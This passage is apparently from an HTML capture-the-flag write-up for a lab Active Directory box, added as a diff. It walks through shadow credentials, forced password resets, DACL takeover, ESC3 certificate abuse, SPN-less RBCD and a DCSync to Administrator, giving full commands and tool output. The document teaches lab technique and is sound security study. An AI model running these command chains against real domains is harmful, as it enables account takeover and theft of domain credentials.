+    <pre><code>ldap_sasl_interactive_bind: Local error (-2)
+  GSSAPI Error: Server not found in Kerberos database</code></pre>
+    <p><strong>Extensive troubleshooting</strong> (documented for anyone hitting the same issue):</p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Confirmed the TGT itself was valid (<code>klist</code>)</li>
+      <li>Confirmed <code>impacket-getST</code> could get a service ticket for the exact same SPN fine — ruling out an actual SPN registration problem</li>
+      <li><code>KRB5_TRACE=/dev/stdout</code> revealed the system's MIT Kerberos library was silently requesting the lowercase, no-DC-prefix SPN instead of the one specified — reverse-DNS-based hostname canonicalization inside libldap/cyrus-sasl's GSSAPI mechanism, occurring before krb5.conf's <code>rdns = false</code> setting could apply (that setting only affects MIT krb5's own internal lookups, not libldap's independent canonicalization step)</li>
+      <li>Tried <code>SASL_NOCANON on</code> in <code>/etc/ldap/ldap.conf</code> and <code>LDAPSASL_NOCANON=yes</code> env var — neither fixed it, canonicalization happens deeper in cyrus-sasl's GSSAPI plugin itself</li>
+    </ul>
+    <p><strong>Working solution:</strong> bypass the system Kerberos/SASL stack entirely and use bloodyAD's pure-Python ldap3-based connection instead:</p>
+    <pre><code>export KRB5CCNAME=bob.w.ccache
+bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'bob.w' -k \
+  set object 'stephen.m' distinguishedName \
+  -v 'CN=Stephen Miller,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'</code></pre>
+    <pre><code>[+] stephen.m's distinguishedName has been updated</code></pre>
+    <p><strong>Shadow Credentials on stephen.m</strong></p>
+    <pre><code>export KRB5CCNAME=natalie.a.ccache
+certipy-ad shadow auto -u 'natalie.a@HERCULES.HTB' -k -no-pass \
+  -dc-host dc.hercules.htb -account 'stephen.m' -ns &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>[*] NT hash for 'stephen.m': &lt;NT_HASH&gt;</code></pre>
+    <p><strong>ForceChangePassword on auditor</strong> — stephen.m is a member of a Security Helpdesk group, which holds the User-Force-Change-Password control-access right over auditor:</p>
+    <pre><code>export KRB5CCNAME=stephen.m.ccache
+bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'stephen.m' -k \
+  set password auditor '&lt;RESET_PASSWORD&gt;'</code></pre>
+    <pre><code>[+] Password changed successfully!</code></pre>
+    <p><strong>Shell as auditor &rarr; User Flag</strong></p>
+    <pre><code>impacket-getTGT hercules.htb/'auditor':'&lt;RESET_PASSWORD&gt;' -dc-ip &lt;TARGET_IP&gt;
+export KRB5CCNAME=auditor.ccache</code></pre>
+    <p>evil-winrm v3.9's Kerberos flags caused early confusion: <code>-k</code> is actually the private-key certificate flag, not "use Kerberos." The correct invocation is <code>-r &lt;realm&gt; -K &lt;ccache_file&gt;</code>:</p>
+    <pre><code>evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S -K auditor.ccache -u auditor</code></pre>
+    <pre><code>*Evil-WinRM* PS C:\Users\auditor\Documents&gt; type C:\Users\auditor\Desktop\user.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+    <p>(Evil-WinRM crashed with a Ruby memory error on session exit right after — a known cosmetic bug, harmless since the flag already printed.)</p>
+    <div class="why"><strong>Why this mattered</strong>This is a textbook BloodHound-style chain: each hop's privilege is small on its own (write one attribute, request one certificate) but composes into a full path once the graph is walked correctly. Shadow Credentials is a particularly clean primitive since it needs no password reset on the target account at all — just an attacker-supplied key.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">11</span><h2>OU Takeover &rarr; ESC3 Certificate Abuse</h2></div>
+    <pre><code>whoami /groups</code></pre>
+    <pre><code>HERCULES\Forest Management    S-1-5-21-...-1104</code></pre>
+    <p><strong>Granting FullControl on the Forest Migration OU</strong></p>
+    <pre><code>export KRB5CCNAME=auditor.ccache
+impacket-dacledit -k -no-pass -dc-ip &lt;TARGET_IP&gt; -dc-host DC.HERCULES.HTB \
+  -action write -principal 'auditor' -rights FullControl -inheritance \
+  -target-dn 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' \
+  'HERCULES.HTB/auditor@DC.HERCULES.HTB'</code></pre>
+    <pre><code>[*] DACL modified successfully!</code></pre>
+    <p><em>Note: <code>-dc-host</code> must be specified explicitly — omitting it caused dacledit to attempt SMB name resolution, which fails on this NTLM-disabled box ("The SMB request is not supported").</em></p>
+    <p><strong>Enumerating the OU</strong></p>
+    <pre><code>bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'auditor' -k \
+  get search --base 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' \
+  --filter '(objectClass=user)' --attr sAMAccountName,userAccountControl,memberOf</code></pre>
+    <p>Notable disabled accounts found: fernando.r (member of Smartcard Operators), iis_administrator (member of Service Operators), plus several disabled computer/service accounts.</p>
+    <p><strong>Re-enabling fernando.r</strong></p>
+    <pre><code>bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'auditor' -k remove uac fernando.r -f ACCOUNTDISABLE
+bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'auditor' -k set password fernando.r '&lt;RESET_PASSWORD_2&gt;'
+impacket-getTGT hercules.htb/'fernando.r':'&lt;RESET_PASSWORD_2&gt;' -dc-ip &lt;TARGET_IP&gt;
+export KRB5CCNAME=fernando.r.ccache</code></pre>
+    <p><strong>Finding the ESC3-Vulnerable Template</strong></p>
+    <pre><code>certipy-ad find -u 'fernando.r@hercules.htb' -k -no-pass \
+  -dc-ip &lt;TARGET_IP&gt; -dc-host DC.HERCULES.HTB -vulnerable -enabled
+grep -B15 "ESC3" 20260710010826_Certipy.txt</code></pre>
+    <p>Three templates flagged ESC3 (Certificate Request Agent EKU), all enrollable by Smartcard Operators: MachineEnrollmentAgent, EnrollmentAgentOffline, and EnrollmentAgent.</p>
+    <p><strong>Requesting the Enrollment Agent Cert</strong> — RPC-based requests timed out (likely another NTLM-dependent path); DCOM worked:</p>
+    <pre><code>certipy-ad req -u 'fernando.r@hercules.htb' -k -no-pass \
+  -dc-ip &lt;TARGET_IP&gt; -dc-host DC.HERCULES.HTB -target dc.hercules.htb \
+  -ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom</code></pre>
+    <pre><code>[*] Saving certificate and private key to 'fernando.r.pfx'</code></pre>
+    <p><strong>On-Behalf-Of Request &rarr; ashley.b</strong></p>
+    <pre><code>certipy-ad req -u 'fernando.r@hercules.htb' -k -no-pass \
+  -dc-ip &lt;TARGET_IP&gt; -dc-host DC.HERCULES.HTB -target dc.hercules.htb \
+  -ca 'CA-HERCULES' -template 'User' -pfx 'fernando.r.pfx' \
+  -on-behalf-of 'hercules\ashley.b' -dcom
+
+certipy-ad auth -pfx 'ashley.b.pfx' -dc-ip &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>[*] Got hash for 'ashley.b@hercules.htb': &lt;NT_HASH&gt;</code></pre>
+    <p>(Direct on-behalf-of requests for Administrator/iis_administrator were blocked — RPC/DCOM permission restrictions specifically deny impersonating high-privilege accounts this way, forcing the pivot through ashley.b.)</p>
+    <div class="why"><strong>Why this mattered</strong>ESC3's Certificate Request Agent EKU is designed for legitimate "enroll on behalf of" workflows (like helpdesk smartcard issuance), but any account that can request such a certificate can mint a certificate for any other user the CA allows — turning one enrollment right into an identity-impersonation primitive.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">12</span><h2>Scheduled Task Abuse &rarr; iis_administrator</h2></div>
+    <pre><code>export KRB5CCNAME=ashley.b.ccache
+evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S -K ashley.b.ccache -u ashley.b</code></pre>
+    <pre><code>cd C:\Users\ashley.b\Desktop
+dir
+# aCleanup.ps1
+.\aCleanup.ps1</code></pre>
+    <p>This script is tied to a scheduled task running as SYSTEM that periodically toggles/cleans up privileged service accounts (part of the box's "account lifecycle simulation") — running it briefly re-enables iis_administrator.</p>
+    <p><strong>Racing the Re-Disable Window</strong> — from a second terminal, immediately:</p>
+    <pre><code>export KRB5CCNAME=auditor.ccache
+impacket-dacledit -k -no-pass -dc-ip &lt;TARGET_IP&gt; -dc-host DC.HERCULES.HTB \
+  -action write -principal 'auditor' -rights FullControl -inheritance \
+  -target-dn 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' \
+  'HERCULES.HTB/auditor@DC.HERCULES.HTB'
+
+bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'auditor' -k remove uac iis_administrator -f ACCOUNTDISABLE
+bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'auditor' -k set password iis_administrator '&lt;RESET_PASSWORD_2&gt;'
+impacket-getTGT hercules.htb/'iis_administrator':'&lt;RESET_PASSWORD_2&gt;' -dc-ip &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>[+] Password changed successfully!
+[*] Saving ticket in iis_administrator.ccache</code></pre>
+    <p>(First attempt hit <code>insufficientAccessRights</code> because the earlier DACL grant had only targeted a support group, not auditor directly, and auditor wasn't a member — re-granting FullControl to auditor explicitly fixed it. It succeeded cleanly on the retry without needing to re-trigger <code>aCleanup.ps1</code>.)</p>
+    <div class="why"><strong>Why this mattered</strong>The aCleanup.ps1 scheduled-task abuse required chaining several commands immediately after triggering the script, before an automated process re-disabled the target account — a reminder that some AD attack paths are genuinely time-sensitive, not just conceptually multi-step.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">13</span><h2>SPN-less RBCD via NT-Hash/Session-Key Trick</h2></div>
+    <p><strong>Confirming the Delegation Setup</strong></p>
+    <pre><code>bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'iis_administrator' -k \
+  get object 'DC$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity</code></pre>
+    <pre><code>msDS-AllowedToActOnBehalfOfOtherIdentity: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-...-1124)</code></pre>
+    <p>The SID confirmed as <code>iis_webserver$</code> — the DC already trusts this account for Resource-Based Constrained Delegation. iis_administrator (via Service Operators) holds ForceChangePassword on it:</p>
+    <pre><code>bloodyAD -H dc.hercules.htb -d HERCULES.HTB -u 'iis_administrator' -k \
+  set password 'iis_webserver$' '&lt;RESET_PASSWORD_3&gt;'</code></pre>
+    <pre><code>[+] Password changed successfully!</code></pre>
+    <p><strong>The Problem: No SPN on iis_webserver$</strong> — it's a user account (not a computer account, despite the $ suffix), so it has no SPN. Standard S4U2Self requires a service to request tickets to itself, which normally needs an SPN. The workaround is S4U2Self with U2U (User-to-User) authentication, but U2U tickets are encrypted with the requesting service's TGT session key, not its long-term key — meaning a normal S4U2Proxy request afterward fails, because the KDC tries to decrypt using the account's long-term NT hash, which doesn't match the session key.</p>
+    <p><strong>The trick:</strong> overwrite the account's actual NT hash to equal the TGT's session key, so the two become the same value and S4U2Proxy's decryption succeeds.</p>
+    <pre><code># 1. Compute NT hash of the new password
+python3 -c "
+import hashlib
+print(hashlib.new('md4', '&lt;RESET_PASSWORD_3&gt;'.encode('utf-16le')).hexdigest())
+"
+# &lt;NT_HASH&gt;
+
+# 2. Get a TGT using that NT hash
+impacket-getTGT hercules.htb/'iis_webserver$' -hashes ':&lt;NT_HASH&gt;' -dc-ip &lt;TARGET_IP&gt;
+
+# 3. Extract the TGT's session key
+describeTicket.py 'iis_webserver$.ccache'</code></pre>
+    <pre><code>Ticket Session Key : &lt;SESSION_KEY&gt;</code></pre>
+    <pre><code># 4. Overwrite the account's NT hash to equal the session key
+export KRB5CCNAME=iis_webserver\$.ccache
+changepasswd.py -newhashes ':&lt;SESSION_KEY&gt;' \
+  HERCULES.HTB/'iis_webserver$':'&lt;RESET_PASSWORD_3&gt;'@DC.HERCULES.HTB -k -dc-ip &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>[*] Password was changed successfully.</code></pre>
+    <p><em>Note: bloodyAD's password-set synchronizes all key types (NT + AES); impacket's <code>changepasswd.py -newhashes</code> changes only the NT (RC4) hash, leaving the TGT (obtained with -hashes, hence RC4-based) internally consistent. Using bloodyAD here would have broken the trick.</em></p>
+    <p><strong>S4U2Self+U2U &rarr; S4U2Proxy</strong></p>
+    <pre><code>export KRB5CCNAME=iis_webserver\$.ccache
+getST.py -k -no-pass -u2u -impersonate 'Administrator' \
+  -spn 'cifs/DC.HERCULES.HTB' HERCULES.HTB/'iis_webserver$' -dc-ip &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.HERCULES.HTB@HERCULES.HTB.ccache</code></pre>
+    <p>Success — the KDC accepted the impersonated CIFS ticket for Administrator.</p>
+    <div class="why"><strong>Why this mattered</strong>RBCD doesn't require a computer account or an SPN. The NT-hash/session-key equalization trick lets a plain user account participate in S4U2Self+U2U/S4U2Proxy delegation despite having no SPN — critical to know that syncing all key types versus touching only the NT hash behave very differently, and only the latter preserves the trick.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">14</span><h2>DCSync &rarr; Root Flag</h2></div>
+    <pre><code>export KRB5CCNAME=Administrator@cifs_DC.HERCULES.HTB@HERCULES.HTB.ccache
+impacket-secretsdump -k -no-pass dc.hercules.htb -dc-ip &lt;TARGET_IP&gt; -just-dc-user administrator</code></pre>
+    <pre><code>Administrator:500:&lt;NT_HASH&gt;:::</code></pre>
+    <pre><code>impacket-getTGT hercules.htb/administrator -hashes ':&lt;NT_HASH&gt;' -dc-ip &lt;TARGET_IP&gt;
+export KRB5CCNAME=administrator.ccache
+evil-winrm -i dc.hercules.htb -r HERCULES.HTB -S -K administrator.ccache -u administrator</code></pre>
+    <pre><code>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+hercules\administrator</code></pre>
+    <p><mark>The machine info panel noted the root flag sits in a non-default location (a different Admin profile's Desktop, not Administrator's own):</mark></p>
+    <pre><code>type C:\Users\Admin\Desktop\root.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>Once a real Administrator-equivalent Kerberos ticket is in hand, DCSync is the standard final step — it directly reads the domain's password database via the same replication protocol domain controllers use with each other, no local shell on the DC required.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">—</span><h2>Key Lessons</h2></div>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li><strong>Regex blacklists on raw input are fragile.</strong> Blocking LDAP metacharacters client- and server-side still failed here because the character <code>%</code> itself was never blocked, and the ASP.NET pipeline silently decoded the input twice — turning a "safe" blacklist into a bypassable one via double URL-encoding.</li>
+      <li><strong>A boolean oracle isn't automatically a clean 3-state oracle.</strong> The naive assumption that "different error message = user exists" broke down because the observed messages only distinguished "≤1 match" from "2+ matches" — not "0" from "1". OR-ing in a known-true anchor condition converts an ambiguous oracle into a reliable one; this generalizes to any blind-injection scenario with a "unique result vs multiple results" distinction.</li>
+      <li><strong>LFI on authenticated endpoints is still LFI.</strong> Requiring a low-privilege login didn't stop path traversal on the download handler from leaking the entire web.config, including cryptographic material.</li>
+      <li><strong>A leaked machineKey means full authentication bypass</strong>, but the specific .NET compatibility mode matters a great deal for tooling — Mono's implementation does not implement the modern anti-padding-oracle ticket format, silently producing wrong (but not obviously "broken") output. Community .NET-Standard reimplementations that explicitly support both modes are far more reliable for offline/cross-platform ticket forgery than trying to run Microsoft's real code under Mono.</li>
+      <li><strong>GSSAPI/Kerberos tooling on Linux has real footguns around hostname canonicalization.</strong> krb5.conf's rdns setting does not control every layer — libldap/cyrus-sasl's own reverse-DNS-based SPN canonicalization can silently request the wrong service principal name even when MIT krb5 itself is configured correctly. Pure-Python tools that implement their own Kerberos/LDAP stacks sidestep this class of bug entirely.</li>
+      <li><strong>Small windows matter.</strong> The scheduled-task abuse required chaining several commands immediately after triggering the script, before an automated process re-disabled the target account — a reminder that some AD attack paths are genuinely time-sensitive, not just conceptually multi-step.</li>
+      <li><strong>RBCD doesn't require a computer account or an SPN.</strong> The NT-hash/session-key equalization trick lets a plain user account participate in S4U2Self+U2U/S4U2Proxy delegation despite having no SPN.</li>
+    </ol>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">—</span><h2>Tools Used</h2></div>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>nmap</code>, <code>ffuf</code>, <code>kerbrute</code> — recon &amp; initial enumeration</li>
+      <li>Custom Python (<code>requests</code>, <code>BeautifulSoup</code>) — LDAP injection oracle automation, blind DFS enumeration, blind attribute extraction</li>
+      <li><code>curl</code> — manual HTTP/LDAP-injection testing, multipart file upload</li>
+      <li><code>msfconsole</code> (<code>auxiliary/fileformat/odt_badodt</code>) — malicious ODT generation</li>
+      <li><code>responder</code> — NetNTLMv2 capture</li>
+      <li><code>hashcat</code> (mode 5600) — NetNTLMv2 cracking</li>
+      <li>.NET 6 SDK + AspNetCore.LegacyAuthCookieCompat (NuGet) — FormsAuthentication ticket forging</li>
+      <li><code>mono-devel</code> — initial (unsuccessful) ticket-forging attempt, useful for understanding the failure mode</li>
+      <li><code>bloodhound-python</code>, <code>bloodyAD</code>, <code>certipy-ad</code>, full impacket suite (getTGT, getST, dacledit, changepasswd, secretsdump, describeTicket) — AD ACL abuse, shadow credentials, ESC3, RBCD, DCSync</li>
+      <li><code>evil-winrm</code> v3.9 (Kerberos-over-SSL via -r/-K) — remote shell access</li>
+    </ul>
+  </div>
+
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
